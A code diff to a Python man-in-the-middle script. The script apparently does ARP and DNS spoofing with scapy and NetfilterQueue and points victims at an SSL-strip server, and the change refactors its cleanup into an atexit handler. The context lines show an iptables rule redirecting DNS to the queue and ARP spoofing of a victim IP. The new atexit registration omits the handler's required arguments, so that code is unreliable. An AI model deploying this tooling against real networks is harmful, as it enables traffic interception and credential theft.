@@ -11,6 +11,8 @@ from netfilterqueue import NetfilterQueue
 from scapy.layers.dns import DNSQR, DNS, DNSRR
 from scapy.layers.inet import IP, UDP
 
+import atexit
+
 localIP = '192.168.1.74'  # SSL Strip Server Address
 
 os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
@@ -49,6 +51,12 @@ def run_arp(victim_ip):
     arp.run()
 
 
+def exit_handler(queue, process):
+    queue.unbind()
+    process.join()  # Escape ARP loop
+    cleaner()
+
+
 def main():
     q = NetfilterQueue()
     q.bind(1, callback)
@@ -64,9 +72,9 @@ def main():
         arp_process.start()  # ARP Sub loop
         q.run()  # Main loop
     except KeyboardInterrupt:
-        q.unbind()
-        arp_process.join()  # Escape ARP loop
-        cleaner()
+        exit_handler(q, arp_process)
+
+    atexit.register(exit_handler)
 
 
 if __name__ == '__main__':
